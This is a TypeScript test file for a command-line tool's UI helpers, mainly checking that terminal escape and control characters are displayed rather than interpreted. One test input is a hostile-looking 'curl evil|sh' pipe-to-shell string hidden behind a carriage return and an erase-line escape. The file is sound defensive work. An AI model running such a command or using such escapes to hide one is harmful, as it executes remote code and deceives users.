import * as clack from '@clack/prompts';
import { describe, expect, it } from 'vitest';

import { unwrapAnswer } from '../src/ui/clack-prompter.ts';
import { formatSize } from '../src/ui/format-size.ts';
import { printable, printableLine } from '../src/ui/printable.ts';
import { PromptCancelledError } from '../src/ui/prompter.ts';

describe('clack answers', () => {
  it('passes answers through and turns a cancel into PromptCancelledError', () => {
    expect(unwrapAnswer('claude-code')).toBe('claude-code');
    expect(() => unwrapAnswer(clack.CANCEL_SYMBOL)).toThrow(PromptCancelledError);
  });
});

describe('printable: nothing from a bundle or the server can drive the terminal (T44)', () => {
  it('shows escape and control characters instead of sending them', () => {
    expect(printable('curl evil|sh #\r\u001b[2K  + hook: fmt.sh')).toBe(
      'curl evil|sh #\\u{000d}\\u{001b}[2K  + hook: fmt.sh',
    );
    expect(printable('a\u202eb\u009bc')).toBe('a\\u{202e}b\\u{009b}c');
  });

  it('keeps newlines, tabs and ordinary text', () => {
    expect(printable('line 1\n\tline 2 ✓ é')).toBe('line 1\n\tline 2 ✓ é');
  });
});

describe('printableLine: a value stays on its one line of a list (SEC-03)', () => {
  it('shows newlines and tabs too', () => {
    expect(printableLine('a\nb\tc')).toBe('a\\u{000a}b\\u{0009}c');
  });

  it('shows what printable shows, and keeps ordinary text', () => {
    expect(printableLine('x\r\u001b[2Ky\u202e')).toBe('x\\u{000d}\\u{001b}[2Ky\\u{202e}');
    expect(printableLine('fmt.sh ✓ é')).toBe('fmt.sh ✓ é');
  });
});

describe('formatSize', () => {
  it('sizes', () => {
    expect([formatSize(900), formatSize(5120), formatSize(2.5 * 1024 * 1024)]).toEqual([
      '900 B',
      '5 KB',
      '2.5 MB',
    ]);
  });
});
